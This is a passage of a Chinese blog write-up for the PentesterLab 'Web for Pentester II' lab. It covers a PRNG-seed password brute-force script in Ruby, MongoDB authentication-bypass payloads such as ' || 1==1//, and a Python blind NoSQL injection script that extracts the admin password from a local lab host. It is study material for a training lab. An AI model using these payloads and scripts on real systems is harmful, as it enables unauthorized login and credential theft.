<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这个例子非常简单并且与第一个例子类似。您只需重播代码即可获取 admin 密码。密码长度是随机的这一事实并不影响您可以猜测它。<br></code></pre></td></tr></table></figure>
<p>尴尬，原来如此简单，如下图成功爆破</p>
<p class='item-img' data-src='image-20231218154052479.png'><img src="image-20231218154052479.png" alt="image-20231218154052479"></p>
<p class='item-img' data-src='image-20231218154114798.png'><img src="image-20231218154114798.png" alt="image-20231218154114798"></p>
<h2 id="Example-4-4"><a href="#Example-4-4" class="headerlink" title="Example-4-4"></a>Example 4</h2>
<p class='item-img' data-src='image-20231218154158780.png'><img src="image-20231218154158780.png" alt="image-20231218154158780"></p>
<p>这一关多了一条代码，我们看看GPT如何解释：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">这段 <span class="hljs-title class_">Ruby</span> 代码的目的是使用 <span class="hljs-string">`Random.new(0)`</span> 创建一个伪随机数生成器对象，并在该对象上进行随机数的生成操作。以下是对代码的详细解释：<br><br><span class="hljs-number">1</span>. <span class="hljs-string">`s = Random.new(0)`</span>: 创建一个新的伪随机数生成器对象，并使用种子值 <span class="hljs-string">`0`</span> 进行初始化。这个对象将用于生成随机数序列。<br><br><span class="hljs-number">2</span>. <span class="hljs-string">`rand(1000).times &#123;s.rand(5)&#125;`</span>:<br>   - <span class="hljs-string">`rand(1000)`</span>: 生成一个介于 <span class="hljs-number">0</span> 和 <span class="hljs-number">999</span> 之间的随机整数。<span class="hljs-string">`rand`</span> 方法用于生成伪随机数，默认范围是 [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)，通过传递参数可以指定范围。<br>   - <span class="hljs-string">`.times &#123;s.rand(5)&#125;`</span>: 针对生成的整数值执行代码块，该代码块中使用 <span class="hljs-string">`s.rand(5)`</span> 生成 <span class="hljs-number">0</span> 到 <span class="hljs-number">4</span> 之间的随机整数，实际上并没有对这些生成的随机数进行进一步的操作。<br><br>总的来说，这段代码创建了一个伪随机数生成器对象 <span class="hljs-string">`s`</span>，然后生成一个介于 <span class="hljs-number">0</span> 和 <span class="hljs-number">999</span> 之间的随机整数，接着对该整数进行循环（<span class="hljs-string">`rand(1000).times`</span>），在每次循环中生成 <span class="hljs-number">0</span> 到 <span class="hljs-number">4</span> 之间的随机整数。在这里，循环的目的似乎只是为了产生一系列随机数而没有直接使用它们。<br></code></pre></td></tr></table></figure>
<p>这里看的解释还是有点懵，我们看看官方如何说：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在此示例中，您不知道在生成密码之前使用了多少次随机生成器（因为它是对 rand(1000) 的调用，而不是 s.rand(1000) 。您仍然可以获得之前生成的密码。要获取它，您只需暴力破解该值，直到获得密码。<br></code></pre></td></tr></table></figure>
<p>这里似乎就理解了，上述<code>rand(1000).times &#123;s.rand(5)&#125;</code>的作用似乎是令<code>s = Random.new(0)</code>执行<code>rand(1000).times</code>次，但这里我们并不知道在此之前<code>s = Random.new(0)</code>执行过几次，但我们仍然是可以进行暴力破解来获取密码的，只需要重复执行题目给我们的源码即可，让我们根据Example 2的脚本进行简单修改即可</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ruby">s = <span class="hljs-title class_">Random</span>.new(<span class="hljs-number">0</span>)<br>rand(<span class="hljs-number">1000</span>).times &#123;s.rand(<span class="hljs-number">5</span>)&#125;<br>pass_admin = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[s.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br>pass_hacker = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[s.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br><br><span class="hljs-keyword">while</span> pass_hacker != <span class="hljs-string">&quot;udxpnv&quot;</span> <span class="hljs-keyword">do</span> <br>    s = <span class="hljs-title class_">Random</span>.new(<span class="hljs-number">0</span>)<br>    rand(<span class="hljs-number">1000</span>).times &#123;s.rand(<span class="hljs-number">5</span>)&#125;<br>    pass_admin = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[s.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br>    pass_hacker = <span class="hljs-number">6</span>.times.map &#123; (<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a[s.rand((<span class="hljs-string">&#x27;a&#x27;</span>..<span class="hljs-string">&#x27;z&#x27;</span>).to_a.size)]&#125;.join<br><span class="hljs-keyword">end</span><br><br>puts <span class="hljs-string">&quot;Password de admin: &quot;</span><br>puts pass_admin<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231218155416879.png'><img src="image-20231218155416879.png" alt="image-20231218155416879"></p>
<p>最终也是成功爆出</p>
<p class='item-img' data-src='image-20231218155440366.png'><img src="image-20231218155440366.png" alt="image-20231218155440366"></p>
<p>成功登录</p>
<h1>0x08 MongoDB 注入</h1>
<p>官方说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">即使 MongoDB 是 NoSQL 数据库，仍然有可能编写易受攻击的代码，因此本练习具有两个 NoSQL 注入。<br>如果您想自己尝试，请尝试按照以下步骤操作：<br><br>    学习并理解 MongoDB 语法是什么样的（找到项目的网站并阅读文档）。<br>    查找可用于删除注入点之后的代码的内容（注释、空字节）。<br>    了解如何生成始终 true 条件（例如 1）。<br>    了解如何检索信息（例如 2）。<br><br>与几乎支持相同语法的 SQL 数据库相反，NoSQL 数据库具有不同的语法。<br></code></pre></td></tr></table></figure>
<h2 id="Example-1-7"><a href="#Example-1-7" class="headerlink" title="Example-1-7"></a>Example 1</h2>
<p class='item-img' data-src='image-20231218162255217.png'><img src="image-20231218162255217.png" alt="image-20231218162255217"></p>
<p>一个熟悉的登录框，这里测试了一下，发现在hacker后面添加单引号会报错，但报错出来的东西似乎也没什么信息，这里还是看了答案才知道如何做的。</p>
<p>但官方提示我们：了解如何生成始终 true 条件（例如 1）。那例子1就是考察万能密码绕过，或者叫nosql永真式注入，但我翻了翻笔记，发现与这一关的通关技巧还不一样，先展示一下官方手法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这个例子是著名的 &#x27; or 1=1 -- 的 MongoDB 版本。如果您还记得之前看到的内容，您就会知道需要做两件事才能绕过此登录：<br><br>始终真实的条件。<br>一种正确终止 NoSQL 查询的方法。<br><br>首先，通过阅读 MongoDB 文档，您可以发现 SQL or 1=1 转换为 || 1==1 （注意双 = ）。然后通过查看，您可以看到 NULL BYTE 将阻止 MongoDB 使用查询的其余部分。您还可以使用注释 // 或 &lt;!-- 注释掉查询的末尾。<br><br>有了这些信息，您应该能够绕过身份验证表单。<br></code></pre></td></tr></table></figure>
<p>也就是说我们将username赋值为<code>hacker' || 1==1//</code>或者<code>hacker' || 1==1&lt;!--</code>或者<code>hacker' || 1//</code></p>
<p class='item-img' data-src='image-20231218163502881.png'><img src="image-20231218163502881.png" alt="image-20231218163502881"></p>
<h2 id="Example-2-7"><a href="#Example-2-7" class="headerlink" title="Example-2-7"></a>Example 2</h2>
<p class='item-img' data-src='image-20231218163534336.png'><img src="image-20231218163534336.png" alt="image-20231218163534336"></p>
<p>这一关是让我们了解如何检索信息</p>
<p>但我也不清楚后台语句，有点蒙蔽的，看了答案发现有点难啊，这些语句都没咋见过。。。这里就跟着wp走了</p>
<p>在第二个也是最后一个练习中，我们必须通过操作 GET 请求来获取管理员密码。</p>
<p>使用以下 URL，无论密码如何，都会显示名为“admin”的用户：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?search=admin&#x27; &amp;&amp; this.password.match(/./)<br></code></pre></td></tr></table></figure>
<p>现在，如果我们更改“/ /”之间的值，我们可以“猜测”密码字符，因为如果该字符在密码中，则将显示管理信息，如果不是，则不会恢复任何内容，如下所示：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?search=admin&#x27; &amp;&amp; this.password.match(/k/)<br></code></pre></td></tr></table></figure>
<p>说白了这里就是根据页面回显情况，判断出需要利用盲注的手段，不过这里的正则匹配没见过。。。。真不知道这是什么语言写的，下去有时间得好好复习了</p>
<p>不过这里的payload似乎需要url编码一下<code> &amp;&amp; </code>编码为<code>%26%26</code></p>
<p>其中最后的// 类似于sql中的–-即注释作用。而%00 空字符也可以阻止后边的执行。 还可以加上正则中的 ^ $ 分别限定。  如果成功，则返回结果，如果false，则无结果返回。 脚本如下：</p>
<p class='item-img' data-src='image-20231218165321581.png'><img src="image-20231218165321581.png" alt="image-20231218165321581"></p>
<p class='item-img' data-src='image-20231218165331299.png'><img src="image-20231218165331299.png" alt="image-20231218165331299"></p>
<p>那毫无疑问得写脚本了，继续向佬们学习写脚本，看了看发现逻辑很简单，试着编写一下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>strs = string.ascii_letters + string.digits<br>url = <span class="hljs-string">&#x27;http://192.168.246.135/mongodb/example2/?search=admin%27%26%26this.password.match(/^&#123;&#125;$/)//+%00&#x27;</span><br>passwords = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> strs:<br>        tmp = passwords + c<br>        html = requests.get(url.<span class="hljs-built_in">format</span>(tmp +<span class="hljs-string">&#x27;.*&#x27;</span>))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            passwords += c<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Find a key:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwords))<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<p>最终爆出密码如下：</p>
<p class='item-img' data-src='image-20231218170408058.png'><img src="image-20231218170408058.png" alt="image-20231218170408058"></p>
<p>这里附上GPT对上述正则的解释（这里不必在乎他对{}的解释）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">正则表达式 `this.password.match(/^&#123;&#125;.*$/)` 在匹配字符串时有一些问题。首先，`&#123;&#125;` 是一个特殊字符，表示一个空的量词（quantifier），用于指定前面的字符或子表达式的重复次数。如果你想匹配字符串中包含的实际的 `&#123;&#125;` 字符，你需要对其进行转义，即写成 `\&#123;\&#125;`。<br><br>然后，这个正则表达式的具体含义是：<br><br>- `^`: 匹配字符串的开头。<br>- `\&#123;\&#125;`: 匹配实际的 `&#123;&#125;` 字符。<br>- `.*`: 匹配任意数量的任意字符（除了换行符），`.*` 表示零个或多个任意字符。<br>- `$`: 匹配字符串的结尾。<br><br>因此，这个正则表达式的意思是匹配以 `&#123;&#125;` 开头，并且后面可以有任意字符的字符串，直到字符串的结尾。<br><br>如果你想要匹配包含 `&#123;&#125;` 的字符串，并且 `&#123;&#125;` 之间至少有一个或多个字符，你可以使用正则表达式 `\&#123;\&#125;.*\&#123;\&#125;`。这个正则表达式的含义是匹配以 `&#123;&#125;` 开头，并且后面至少有一个或多个字符，然后再跟着 `&#123;&#125;`，即 `&#123;&#125;` 之间至少有一个或多个字符。<br></code></pre></td></tr></table></figure>
<p>所以这里的.*与<code>^</code>和<code>$</code>配合，是为了保证我们从密码的第一位字符开始匹配至最后一位，而不会造成匹配密码的中间某些字符的情况出现</p>
<h1>0x09 后言</h1>
<p>这个练习也是收获良多，但同时让我明白了我之前的学的web基础漏洞知识仍然有所欠缺，日后会坚持刷一些web靶场，以及红队靶场，只能说感觉时间好紧张，目前的我仍然认为自己掌握的就是一坨答辩，真的很糟心。对此先不吐槽了，还是抓紧时间学习吧~~，之后再把这个靶场的第一个版本刷一下，就正式完结了。</p>
<h1>0x10 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.chuanpuyun.com/article/2124.html">CTF靶场系列-Pentester Lab: Web For Pentester II</a></p>
<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2016/03/30/web-for-pentest-II/#/example6-2">web_for_pentest_II writeup</a></p>
<p><a target="_blank" rel="noopener" href="https://pentesterlab.com/exercises/web_for_pentester_II/course">官方解释</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85253">【技术分享】Web for Pentester II练习题解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackplayers.com/2017/08/pentesterlab-write-up-web-for-pentester-2-random-and-mongodb.html">[Pentesterlab write-up] Web For Pentester II - Randomness Issues &amp; MongoDB injection</a></p>
<p>nosql参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9908#toc-12">Nosql 注入从零到一</a> --感觉挺不错，日后有机会在好好学学</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/12/14/%E5%86%8D%E6%8E%A2SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">← 下一篇 再探SQL报错注入</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/12/13/Thm%E7%B3%BB%E5%88%974/">Thm-Pre Security 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">0x01 搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">0x02 SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1"><span class="toc-number">2.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2"><span class="toc-number">2.2.</span> <span class="toc-text">Example 2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9A"><span class="toc-number">2.2.1.</span> <span class="toc-text">姿势一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">姿势二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3"><span class="toc-number">2.3.</span> <span class="toc-text">Example 3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80"><span class="toc-number">2.3.1.</span> <span class="toc-text">姿势一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9A-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">姿势二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-4"><span class="toc-number">2.4.</span> <span class="toc-text">Example 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-5"><span class="toc-number">2.5.</span> <span class="toc-text">Example 5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LIMIT%E5%92%8CORDER-BY%E5%A6%82%E4%BD%95%E7%BB%84%E5%90%88%E4%BD%BF%E7%94%A8"><span class="toc-number">2.5.1.</span> <span class="toc-text">LIMIT和ORDER BY如何组合使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-6"><span class="toc-number">2.6.</span> <span class="toc-text">Example 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-7"><span class="toc-number">2.7.</span> <span class="toc-text">Example 7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9A-2"><span class="toc-number">2.7.1.</span> <span class="toc-text">姿势一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#concat-%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.2.</span> <span class="toc-text">concat()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#group-concat-%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.3.</span> <span class="toc-text">group_concat()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#concat-ws-%E5%87%BD%E6%95%B0"><span class="toc-number">2.7.4.</span> <span class="toc-text">concat_ws()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9A-3"><span class="toc-number">2.7.5.</span> <span class="toc-text">姿势二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-8"><span class="toc-number">2.8.</span> <span class="toc-text">Example 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-9"><span class="toc-number">2.9.</span> <span class="toc-text">Example 9</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">0x03 Authentication-认证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-2"><span class="toc-number">3.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-2"><span class="toc-number">3.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-2"><span class="toc-number">3.3.</span> <span class="toc-text">Example 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-4-2"><span class="toc-number">3.4.</span> <span class="toc-text">Example 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-5-2"><span class="toc-number">3.5.</span> <span class="toc-text">Example 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-6-2"><span class="toc-number">3.6.</span> <span class="toc-text">Example 6</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 Captcha-验证码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-3"><span class="toc-number">4.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-3"><span class="toc-number">4.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-3"><span class="toc-number">4.3.</span> <span class="toc-text">Example 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-4-3"><span class="toc-number">4.4.</span> <span class="toc-text">Example 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-5-3"><span class="toc-number">4.5.</span> <span class="toc-text">Example 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-6-3"><span class="toc-number">4.6.</span> <span class="toc-text">Example 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-7-2"><span class="toc-number">4.7.</span> <span class="toc-text">Example 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-8-2"><span class="toc-number">4.8.</span> <span class="toc-text">Example 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-9-2"><span class="toc-number">4.9.</span> <span class="toc-text">Example 9</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 Authorization-授权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-4"><span class="toc-number">5.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-4"><span class="toc-number">5.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-4"><span class="toc-number">5.3.</span> <span class="toc-text">Example 3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">0x06 Mass Assignment-覆盖属性</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-5"><span class="toc-number">6.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-5"><span class="toc-number">6.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-5"><span class="toc-number">6.3.</span> <span class="toc-text">Example 3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">0x07 Randomness Issues-随机性问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-6"><span class="toc-number">7.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-6"><span class="toc-number">7.2.</span> <span class="toc-text">Example 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-3-6"><span class="toc-number">7.3.</span> <span class="toc-text">Example 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-4-4"><span class="toc-number">7.4.</span> <span class="toc-text">Example 4</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">0x08 MongoDB 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-1-7"><span class="toc-number">8.1.</span> <span class="toc-text">Example 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example-2-7"><span class="toc-number">8.2.</span> <span class="toc-text">Example 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">0x09 后言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">0x10 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>